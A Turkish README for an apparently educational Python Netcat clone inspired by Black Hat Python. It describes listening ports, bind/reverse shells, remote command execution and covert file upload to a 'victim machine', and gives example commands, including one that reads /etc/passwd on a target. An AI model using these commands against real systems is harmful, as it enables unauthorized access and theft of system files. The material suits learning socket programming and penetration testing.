# BHP-Net-Tool (Python Netcat Clone) 🕷️

Bu proje, siber güvenlik sızma testlerinde (penetration testing) ağ üzerinden iletişim kurmak için sıklıkla kullanılan efsanevi **Netcat (nc)** aracının Python ile sıfırdan yazılmış bir klonudur. 

Temel ağ (network) konseptlerini, **Socket programlamayı** ve **Threading (Eşzamanlılık)** mantığını derinlemesine anlamak amacıyla, *Black Hat Python* konseptlerinden ilham alınarak geliştirilmiştir.

## 🚀 Özellikler (Features)

Bu araç ile bir hedef sistem üzerinde veya kendi ağınızda şunları yapabilirsiniz:
* **Port Dinleme (Listening):** Belirtilen bir portta pusuda bekleyip gelen bağlantıları kabul etme.
* **Tersine Kabuk (Reverse Shell / Command Shell):** Bağlantı sağlandıktan sonra hedef sistemde interaktif bir terminal (shell) başlatma.
* **Uzaktan Komut Çalıştırma (Remote Execution):** Bağlanılan sisteme tekil sistem komutları gönderip çıktısını alma.
* **Dosya Transferi (File Upload):** Kendi bilgisayarınızdan hedef sisteme gizlice dosya yükleme.

## 🛠️ Nasıl Kullanılır? (Usage)

Aracı çalıştırmak için Python 3 gereklidir. Terminal veya komut satırından parametreler ile kullanılır.

**Yardım Menüsünü Görmek İçin:**
```bash
python NetCat.py --help
```
**1. Port Dinleme ve İnteraktif Kabuk (Bind/Reverse Shell)**
Saldırgan makinesinde belirtilen portu dinlemeye alır ve bağlantı sağlandığı anda karşı tarafa bir komut satırı (shell) açar:

```bash
python NetCat.py -t 192.168.0.1 -p 5555 -l -c
```

**2. Dosya Yükleme (File Upload)**
Dinleme modunda bekler ve kurban makineden bağlantı geldiğinde, verileri alıp belirtilen hedefe (örneğin c:\target.exe) bir dosya olarak kaydeder:

```bash
python NetCat.py -t 192.168.0.1 -p 5555 -l -u=c:\target.exe
```

**3. Tekil Komut Çalıştırma (Command Execution)**
Bağlantı sağlandıktan sonra sadece tek bir komutu (örneğin Linux sistemlerde şifrelerin tutulduğu passwd dosyasını okumak) çalıştırır ve çıktısını ekrana basar:

```bash
python NetCat.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd"
```

**4. İstemci Olarak Veri Gönderme (Client Mode)**
Terminalde yazılan bir veriyi veya metni alıp, hedef IP adresinde zaten dinlemekte olan bir sunucuya (porta) doğrudan yollar:

```bash
echo 'ABCDEFGHI' | python NetCat.py -t 192.168.11.12 -p 135
```
